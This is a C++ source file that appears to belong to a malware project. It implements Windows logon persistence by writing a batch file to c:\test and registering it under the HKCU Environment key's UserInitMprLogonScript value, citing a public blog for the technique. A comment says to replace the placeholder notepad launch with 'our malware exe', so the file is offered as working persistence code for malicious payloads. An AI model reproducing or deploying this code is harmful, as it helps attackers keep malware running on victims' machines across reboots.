#include "persist.h"


void persist_execution(void){

    /* 
    The bat file is in the same directory for reference.
    Create the bat file first - and then this following code will create the registry that will
    start the bat file on startup.
    */

   // Creates a folder for the bat file

   // Persistent method found here
   // https://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/
   mkdir("c:\\test");

   // Writes to a new bat file
   std::ofstream batfile;
   batfile.open("c:\\test\\UserInitMprLogonScript.bat");

   // Commands for file
   batfile << "@echo off\n";
   //Test purposes
   //batfile << "@echo # 'UserInitMprLogonScript'\n";
   //batfile << "@if exist c:\\test\\UserInitMprLogonScript.log @del c:\\test\\UserInitMprLogonScript.log\n";
   //batfile << "@echo UserInitMprLogonScript executed !> c:\\test\\UserInitMprLogonScript.log\n";
  
   //change this line with our malware exe
   batfile << "@start \"c:\\Windows\\System32\\notepad.exe\\\"\n";
   batfile << "@pause\n";
   
   // Close the file since finished with writing
   batfile.close();


    // Following section creates a registry key to open bat file on Window startup
    // https://stackoverflow.com/questions/508614/create-a-new-windows-registry-key-using-c
    HKEY hKey;
    LPCTSTR environment = TEXT("Environment");


    LONG test = RegCreateKeyEx(HKEY_CURRENT_USER, environment, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

    // For testing
    // if(test==ERROR_SUCCESS){
    //     printf("success");
    // }else{
    //     printf("failed");
    // }

    LPCTSTR name = TEXT("UserInitMprLogonScript");
    LPCTSTR data = TEXT("c:\\test\\UserInitMprLogonScript.bat");

    LONG test2 = RegSetValueEx(hKey, name, 0, REG_SZ, (LPBYTE) data, (_tcslen(data)+1)*sizeof(TCHAR));

    // For Testing
    // if(test2==ERROR_SUCCESS){
    //     printf("success2");
    // }else{
    //     printf("failed2");
    // }

    // Closes handle to key
    RegCloseKey(hKey);

}